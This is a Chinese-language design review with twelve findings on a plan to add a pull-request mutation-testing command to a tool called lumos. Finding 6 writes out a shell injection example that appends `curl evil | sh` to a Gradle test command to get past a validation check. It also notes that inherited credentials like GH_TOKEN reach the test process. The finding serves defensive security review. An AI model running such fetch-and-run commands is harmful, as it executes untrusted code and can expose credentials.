severity: major

以下逐條 finding。我沒有跑 `gh`(審查席的 Bash 擋它),所以 gh 欄位的說法標 ⚠。

1. 〈做法〉4 和〈落點〉把「掃描兩支函式加 `repo`/`at_sha` 參數」當成要新做的事,但這兩個參數現況已存在
   severity: minor
   blocking: 否:只是過時的工作量描述,實作者讀程式就會發現,不會做出壞東西。
   - 問題:D7 說 `choice-points` 要「加參數接受哪個 repo、哪個提交」。〈做法〉4 說 `_choice_changed`、`_choice_compute` 要「加 `repo`、`at_sha` 參數」。〈回退〉說「新加的參數預設值等於現在的行為」。三處都是過時假設。
   - 佐證:file: `scripts/lumos:77926`,簽名是 `_choice_changed(repo_root, rng, at_sha, deadline=None)`。file: `scripts/lumos:78563`,`_choice_compute(repo_root, rng, at_sha, tables, ...)` 也一樣。file: `scripts/lumos:78655`,`cmd_choice_points(env, diff=None, branch=None, repo=None)` 已有 `repo`。
   - 影響:實際缺的只有「不碰工作目錄帳的掃描入口」。`cmd_choice_points` 會呼叫 `_choice_ledger_status`,而那支讀工作目錄治理帳(file: `scripts/lumos:78655` 起),違反 D3。計劃應改寫成「直接呼叫 `_choice_range` 加 `_choice_compute`」。
   - 另一處過時:〈做法〉3 說 Java 要「加一條同形的規則」,但 `JAVA_TEST_RE` 已存在(file: `scripts/lumos:6081`)。

2. 〈做法〉4 說「重用 `_kill_merge_apply`/`_kill_merge_restore`/`_kill_run`」,但這些函式吃一個很重的現場物件 `c`,計劃沒說這個物件由誰、怎麼造
   severity: blocker
   blocking: 是:照 D7 寫會卡死,或悄悄把單支基準與帳邏輯帶回來,違反 D3、D6。
   - 問題:這三個函式的 `c` 不是普通參數。`_kill_merge_apply` 的第一步用 `c.wt`、`c.wt_real` 定位目標檔,最後一步又用 `c.mstate`。中間 `lane_unsure = any(c.baselines[_run_cmd_expand(c.run_cmd, m, name_filter=nf)][4] for m in lane)` 逐支查**單支基準**。審別人沒有單支基準(D6),`c.baselines` 是空的,這裡直接 KeyError。
   - 佐證:file: `scripts/lumos:29202`(`_kill_merge_apply` 全文)。`_kill_merge_restore` 失敗時寫 `c.results.append(...)`、讀 `c.plat`(file: `scripts/lumos:29086`)。
   - 佐證:`c` 的說明明寫「c 是 cmd_guard_kill 給的現場(SimpleNamespace)」(file: `scripts/lumos:29032`)。D7 又寫明不經 `cmd_guard_kill`。
   - 佐證:`r0` 必須是逐支配方列,帶 `file`、`old`、`new`、`group`、`test` 欄位,由 `_kill_old_issue`、`_kill_new_issue`、`_kill_mutated` 檢查。計劃沒寫選擇點壞法(`mutant` 的 `identity` 結構)怎麼轉成這種列。
   - 佐證:`_kill_merge_screen` 還依賴 `c.hk.should_stop`、`c.sh["rdir"]`、`c.sh["tq"]`、`c.floor`、`mg`(`_KillMerge`)。`_kill_run(merge=mg)` 的訊號處理也要靠 `mg`(file: `scripts/lumos:29294-29325`)。
   - 影響:要嘛造一個假 `c`,把 `baselines` 填成全綠假值,這會變成新的隱含合約。要嘛改這些函式、拆出不吃 `c` 的核心。後者動到自審路徑,與〈不做〉「不改自審的 choice-kill」衝突。計劃應寫明選哪條,以及 `c`、`mg` 的最小欄位表。
   - 同源的延伸:〈做法〉4 要用「事件行看得出掛住的那支」,但事件初始化腳本寫在 `_kill_merge_base`(file: `scripts/lumos:29101` 一帶,`_choice_merge_init_write`),新執行器不經過它。沒呼叫就沒有事件行。

3. 〈做法〉3 第三層的合併指令用「類別完整名」,但 `_choice_merge_classify` 把 names 當**方法名**判,通過路徑會永遠判成沒跑乾淨
   severity: blocker
   blocking: 是:第三層是 S1 的另一半驗收,照寫會讓第三層所有壞法都判不出「存活」。
   - 問題:計劃寫「每個類別一段 `--tests '<類別完整名>'`」。classify 在無失敗時做 `miss = [m for m in names if _choice_merge_hits(fulls, m) != 1]`。`_choice_merge_hits` 只認「完整名等於 m,或以 `.m` 結尾」。結果檔裡的完整名是 `類別.方法`,傳入的是類別完整名,命中 0 次,`miss` 非空,回 `unclean, "N 支對不到結果檔裡的名字"`。
   - 佐證:file: `scripts/lumos:28943`(`_choice_merge_classify`)與 `_choice_merge_hits`、`_choice_merge_fullname`。
   - 影響:第三層一律回 `unclean`,等於「跑不出結果」。S1 第二案(沒改測試檔→第三層)會得到空報告。計劃要嘛第三層也展開成方法名(代價是更容易超過 32768 位元組上限),要嘛新寫類別層的判讀,不能重用 classify。
   - 同類:〈做法〉4「基準不過→拿掉失敗那支重跑」在類別層做不到,只能拿掉整個類別。
   - 同類:`_kill_merge_ready` 還要過 `_test_name_ok` 與 `_name_collision_reason`(file: `scripts/lumos:29039`),計劃也沒提這一道。

4. 〈做法〉3:測試來源只取「第一層有測試的」,沒保證選到的測試碰得到被變異的檔,存活結果會大量是假警報
   severity: major
   blocking: 是:這直接決定「存活點變審查意見」的雜訊比,RETIRE-IF 的 10% 門檻也依賴它,且設計層面沒有防線。
   - 問題:第一層是「計劃綁的測試」,第二層是「PR 改到的測試檔」。這兩層的測試跟被變異的正式碼檔沒有必然覆蓋關係。例如 PR 改了 `A.kt` 和 `B.kt`,但只動了 `B` 的測試。第二層會被選中,`A.kt` 的所有壞法都「全綠=存活」,但根本沒有測試碰過 `A`,問作者「這個邊界是刻意的嗎?」是誤導。
   - 佐證:〈做法〉3 寫「取第一層有測試的,報告寫明用的是哪一層」,沒有按檔或模組過濾、也沒有合併多層。
   - 影響:第二層以後應至少按「存活點所在模組」過濾測試,或把沒有任何選中測試屬於該模組的壞法標成「無測試涵蓋」,而不是存活。
   - 延伸:第二層與第三層界線也沒算「PR 改了測試檔,但全是別的模組」的情況。

5. D5 宣稱「Kotlin、Java」,但掃描與選壞法只支援 Kotlin 正式碼
   severity: major
   blocking: 是:範圍宣稱與實作能力對不上,Java PR 會得到「沒有選擇點」卻被讀成「全守住」。
   - 問題:`_choice_changed` 的文件寫「範圍內 .kt 正式碼的改到的行」,走 `_kt_sit_hunks`,只對 `*.kt` 下 diff(`_ns_diff(repo_root, diff_range, "--", "*.kt")`)。選擇點表是「Kotlin 型錄」(`cmd_choice_points` 的錯誤訊息)。Java 正式碼沒有被掃的路。
   - 佐證:file: `scripts/lumos:77926`、`_kt_sit_hunks` 函式本文、file: `scripts/lumos:78655`。
   - 影響:計劃沒有提供 Java 掃描(語法樹規則、壞法表)。D5「Kotlin、Java」與〈不做〉「JVM 單元測試」會讓使用者以為 Java 正式碼也被審。報告必須對 Java 正式碼寫「沒掃」,或第一版收窄成 Kotlin 正式碼(Java 只能當測試)。

6. 執行不可信碼:同 repo PR 的測試指令來源是 PR 頭提交裡的 `.lumos/config.json`,攻擊面比計劃寫的更大,且 `--trust` 沒有涵蓋這條
   severity: major
   blocking: 是:這個功能碰「執行別人程式碼」這個風險類,風險類逐類回答見末段。這裡的洞是設定檔被當成可信來源。
   - 問題:〈做法〉2 說「審查樹裡有 `.lumos/config.json` … 用它的 `run_cmd`」。審查樹是 PR 頭,`run_cmd` 是 `_kill_run(..., shell=True)` 的完整 shell 字串(file: `scripts/lumos:28194`)。除了 Gradle 本身會執行 `build.gradle`、wrapper,PR 作者還能直接把任意 shell 寫進 `run_cmd`。`_choice_merge_shape` 只檢查「有一個 `{method}`、恰好一個 Gradle 任務」,但不禁止 `&&`、`$(...)` 在**其他段**(它只擋含 `{method}` 那一段的元字元,見 `_choice_merge_shape` 內 `any(ch in seg for ch in "&;|<>")`)。`gradle -p x test --tests {method} && curl evil | sh` 的 `{method}` 段仍乾淨,可通過 shape。
   - 佐證:file: `scripts/lumos:28783`(`_choice_merge_shape`:只驗含 `{method}` 的那一段)。
   - 影響:同 repo 的 PR 不設防,D2 已承認「帳號被盜的同事會照跑」,但那是講 Gradle 測試碼。這裡是讓 PR 直接指定 shell 指令。〈實務隱患〉要補:同 repo 時 `run_cmd` 改讀基底提交的設定,或要求 `--run-cmd`,而不是讀 PR 頭。
   - 環境變數:子程序繼承使用者整個環境(雲端憑證、`GH_TOKEN`),計劃沒提清環境。fork + `--trust` 時尤其要緊。

7. 〈做法〉1:只 fetch `pull/<編號>/head`,沒保證 `baseRefOid` 在本機,而範圍要 merge-base
   severity: major
   blocking: 是:缺基底提交時 `_choice_range` 兩端解不出來,整個指令一開始就停。
   - 問題:〈用詞〉寫範圍是 `merge-base(基底, 頭)..頭`。`_choice_range` 在給 `--diff` 時要 `_lens_full_sha(rr, ends[0])` 與 `ends[1]` 都解得到,否則回「兩端要解得到提交」(file: `scripts/lumos:78620`)。計劃只 fetch PR 頭;基底提交若本機沒有(淺 clone、使用者 repo 沒更新主線),`merge-base` 算不出。
   - 影響:要補:同時 fetch 基底 ref,或用 `git merge-base` 失敗時走 `gh pr diff`/API。另外 `gh pr view` 的 repo 解析取決於 `gh repo set-default`,計劃另說「remote 取 URL 指向這個 GitHub repo 的那個」,兩者可能指向不同 repo(fork 開發者常見),計劃沒說不一致時怎麼辦。⚠ gh 的 repo 解析細節我沒有跑。

8. `gh pr view --json closingIssuesReferences` 能不能拿到 issue 內文,計劃沒驗證
   severity: minor
   blocking: 否:只影響回指第二層的資料來源,第三層(問題)是兜底,功能不會壞。
   - 問題:〈做法〉5 第二層要掃「連結 issue 的內文」。`closingIssuesReferences` 通常只給編號與網址等欄位;內文可能要另外 `gh issue view`。另外「連結」只涵蓋 closing 關鍵字,不含描述裡寫的 `#12`。⚠ 我沒跑 `gh pr view --help`,依經驗判斷,實作時要先驗。
   - 〈依據來源〉那一欄只實測了 `baseRepository` 不存在,沒實測 `closingIssuesReferences` 的子欄位。

9. 〈做法〉4:時限與逾時上限的來源沒有定義
   severity: minor
   blocking: 否:預設值可以在實作時補,不影響設計方向。
   - 問題:`_choice_merge_screen_cap(m_el, floor, remaining)` 的 `m_el` 是「合併基準耗時」,`floor` 是下限,`remaining` 是剩餘總時限。計劃說「上限照 `_choice_merge_screen_cap`」,但新執行器的合併基準耗時要自己量(〈做法〉4 的第一步有跑一次基準,可兼用)。計劃沒寫 `floor` 取值,也沒寫基準本身的逾時上限(自審走 `_choice_merge_base_cap`,吃單支基準總和,在這裡不存在)。基準若掛住整個預算就沒了。

10. 〈做法〉6/〈實務隱患〉:暫存、收尾與中斷
    severity: minor
    blocking: 否:都有可行的補法,屬於補寫細節。
    - `--out` 預設「系統暫存資料夾、印出路徑」,報告檔誰刪沒說(跟全域暫存清理規則相關);不算審查樹的一部分,S6 只驗審查樹已刪。
    - 中斷(Ctrl-C):自審靠 `_KillMerge.on_signal` 與 `_KILL_RUN_LIVE` 收程序群組(file: `scripts/lumos:28194` 註解)。新執行器不經 `_ChoiceKillRun`,計劃沒說訊號怎麼處理、Gradle daemon 留不留。`_isolated_worktree` 本身有清殘骸(`_isolated_worktree_sweep`),但只在傳 `sweep_repo` 時打開(file: `scripts/lumos:28095`),計劃沒說傳不傳。
    - Gradle daemon 與 `~/.gradle` 快取是使用者 repo 之外的共享狀態,S6 的「沒變」驗不到,〈實務隱患〉沒列。

11. D3 與〈做法〉4:「不讀治理帳」的邊界與實際重用函式有衝突
    severity: minor
    blocking: 否:是邊界澄清,實作者會自己發現。
    - 問題:〈做法〉3 第一層用 `_choice_spec_calc`(file: `scripts/lumos:78858`)。它在記憶體圖譜上算,但會呼叫 `_kt_sit_spec_names_calc`,是否讀使用者 repo 的工作目錄筆記需要驗。S6 要求「治理帳不變」,但沒寫「也不讀」。D3 寫「不寫、不讀任何治理帳與殺傷力帳」,而 `_choice_changed` 內呼叫的 `_vendored_skip`、`_drift_list` 等是否讀工作目錄帳,計劃沒驗。S6 只測「沒變」,測不到「有沒有讀」,D3 的「不讀」沒有對應驗收條款。

12. 其餘節
    - 〈白話〉、〈用詞〉、〈舊否決比對〉、〈不做〉、〈預期值表〉:已讀,無 finding(S3 的〈預期值表〉與 S3 條款一致)。〈舊否決比對〉引用的兩份計劃檔都存在,交叉引用核對過。
    - 〈回退〉:「掃描兩支函式新加的參數預設值等於現在的行為」隨 finding 1 一起過時,不另列。

固定席(`Systems/guard-kill`)逐條判:
- INVARIANT「guard kill rc 優先序」:不影響。計劃明寫不呼叫 `cmd_guard_kill`,`_kill_run` 與 `_kill_merge_*` 也是被呼叫端,不改它們的回傳或 rc。**但**這個結論只在 finding 2 選「造假 `c`」那條路時成立。若選「改函式拆核心」,就會碰到自審與 guard kill 共用的 `_kill_merge_apply`/`_kill_run`,必須重跑該合約的綁定測試 `t_guard_kill_rc_precedence`。
- INVARIANT「guard kill --json 成功時 stdout 恰一行 JSON」:不影響。新指令 `choice-review` 不經 guard kill 的輸出路徑。

風險類逐類:
- 執行別人程式碼:有,見 finding 6 與 D2。
- 時間預算:有,見 finding 9(`--max-seconds` 預設 1800 秒,基準逾時沒定義)。
- 暫存與收尾:有,見 finding 10。
- 對外送出(留言):有。`--comment` 要使用者明講,D4 已設防。計劃沒寫留言內容的消毒。報告含 PR 描述原文、程式碼片段,貼回 PR 沒問題,但來源若是 fork PR 的 `--trust`,貼回的是別人的文字,這是公開回顯,不算新洩漏。留言長度上限(GitHub 約 65536 字)沒處理。
- 回退:有。〈回退〉寫得足夠,只因 finding 1 的前提錯,需改寫。
- 金流:無。只在本機跑測試。
- 不可逆:無。不寫帳、不改分支,審查樹收尾刪。
- 守衛面:無。不改推送前的閘。

最高 blocker,blocking 6 條。
